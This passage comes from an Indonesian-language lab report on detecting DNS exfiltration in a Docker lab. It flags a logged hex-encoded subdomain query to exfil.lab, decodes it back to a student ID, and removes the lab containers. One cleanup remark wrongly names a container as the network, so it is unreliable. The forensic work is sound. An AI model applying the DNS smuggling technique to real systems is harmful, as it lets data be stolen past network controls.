Docker Compose berhasil mengarahkan output log dari container dns ke dalam file `dns-k9.log` yang ditandai dengan tidak munculnya teks di layar terminal. File log ini menyimpan rekaman kueri DNS yang masuk dari penyerang beserta payload subdomain heksadesimal yang dikirimkan sebelumnya.

### 5. Mendeteksi Anomali DNS Exfiltration Menggunakan Skrip Analisis Log
Perintah ini digunakan untuk menjalankan skrip Python `analisis_dns.py` terhadap file `log dns-k9.log` guna menghitung frekuensi kueri per domain induk serta mengidentifikasi subdomain mencurigakan yang berpotensi membawa muatan data tersembunyi.
```bash
python3 01-sumber-lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log
```
**Hasil Pengujian**
```text
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):
  panjang=36  4e494d2d32343535323031313231362d4b39.k9.exfil.lab
  ```
**Analisis:**
Skrip `analisis_dns.py` berhasil memindai file `dns-k9.log` dan mengidentifikasi 1 kueri mencurigakan menuju domain induk `exfil.lab` dengan panjang label subdomain 36 karakter heksadesimal (`4e494d2d32343535323031313231362d4b39.k9.exfil.lab`). Pola nama subdomain yang sangat panjang dan acak/heksadesimal seperti ini merupakan indikator kuat adanya upaya penyelundupan data (DNS Exfiltration) melalui protokol DNS.

### 6. Mendekode Payload Heksadesimal Kembali ke Teks Asli (Decoding)
Perintah ini digunakan untuk membalikkan (reverse) proses encoding heksadesimal menggunakan utilitas `xxd -r -p` guna membaca isi data rahasia yang diekstrak dari subdomain log DNS.
```bash
echo 4e494d2d32343535323031313231362d4b39 | xxd -r -p
```
**Hasil Pengujian**
```text
NIM-24552011216-K9
```
**Analisis:**
Utilitas `xxd -r -p` berhasil menerjemahkan string heksadesimal `4e494d2d32343535323031313231362d4b39` kembali menjadi teks asli yaitu `NIM-24552011216-K9`. Hal ini membuktikan secara forensik bahwa data yang diselundupkan melalui kueri DNS dapat dipulihkan secara utuh oleh pihak penerima maupun analis keamanan.

### 7. Menghentikan dan Membersihkan Lingkungan Simulasi DNS Exfiltration
Perintah ini digunakan untuk menghentikan layanan yang berjalan pada proyek `k9` serta menghapus seluruh container, jaringan (`k9_lab`), dan volume terkait setelah pengujian DNS Exfiltration selesai.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml down -v
```
**Hasil Pengujian**
```text
[+] Running 3/3
✓ Container k9-dns-1       Removed                              0.2s
✓ Container k9-attacker-1  Removed                              10.3s
✓ Network k9_lab           Removed                              0.1s
```
**Analisis:**
Docker Compose berhasil membersihkan lingkungan lab dengan menghapus container `k9-dns-1`, `k9-attacker-1`, serta jaringan `k9-attacker-1`. Opsi `-v` memastikan seluruh volume terkait juga ikut terhapus sehingga sistem kembali bersih dan bebas dari sisa resource pengujian.
